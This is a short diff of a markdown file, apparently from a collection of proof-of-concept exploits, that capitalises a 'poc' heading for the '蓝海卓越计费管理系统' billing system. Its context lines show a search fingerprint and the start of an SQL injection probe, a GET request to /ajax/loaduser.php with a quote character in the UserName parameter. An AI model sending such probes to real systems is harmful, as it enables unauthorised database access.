@@ -10,7 +10,7 @@ title=="蓝海卓越计费管理系统"
 
 
 
-## poc
+## POC
 
 ```
 GET /ajax/loaduser.php?UserName=aaa%27 HTTP/1.1
